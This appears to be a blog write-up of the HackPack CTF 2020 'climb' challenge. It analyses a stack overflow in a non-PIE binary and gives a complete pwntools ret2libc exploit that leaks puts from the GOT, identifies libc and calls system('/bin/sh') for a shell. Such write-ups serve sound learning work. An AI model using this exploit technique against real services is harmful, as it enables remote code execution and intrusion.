---
layout: post
title: HackPack CTF 2020 - climb 
---

> Can you help me climb the rope?
>
> nc cha.hackpack.club 41702
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
climb: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l,
for GNU/Linux 3.2.0, BuildID[sha1]=6e66cad4e6085cf682b27c0b31d7b00597422291, not stripped

Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Decompiling main reveals stack overflow vulnerability.

![decompiled_main decompiled_main][decompiled_main]

We can overwrite return address by sending `40 + 8` bytes. First we want to leak libc address. We can achieve this by leaking `puts@got`.

{% highlight python %}
payload = (
    b"A" * 40 +
    p64(0x400743) + # : pop rdi ; ret
    p64(exe.got["puts"]) +
    p64(exe.plt["puts"]) +
    p64(exe.functions["main"].address)
)
io.send(payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)
{% endhighlight %}

Checking out leaked `puts` address on libc database shows that on the target system `libc6_2.27-3ubuntu1_amd64.so` is used.

Once we know what libc is used and what is `puts` address we can send final payload that exploits service.

{% highlight python %}
payload = (
    b"A" * 40 +
    p64(0x400744) +
    p64(0x400743) + # : pop rdi ; ret
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)
io.send(payload)
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./climb')
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41702)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start(env={"LD_PRELOAD": "./libc6_2.27-3ubuntu1_amd64.so"})
io.recvuntil("How will you respond? ")

payload = (
    b"A" * 40 +
    p64(0x400743) + # : pop rdi ; ret
    p64(exe.got["puts"]) +
    p64(exe.plt["puts"]) +
    p64(exe.functions["main"].address)
)
io.send(payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

io.recvuntil("How will you respond? ")
payload = (
    b"A" * 40 +
    p64(0x400744) +
    p64(0x400743) + # : pop rdi ; ret
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)
io.send(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/hackpackctf/climb
[decompiled_main]: {{site.baseurl}}/ctf/2020-04-29-hackpackctf-climb/decompiled_main.png
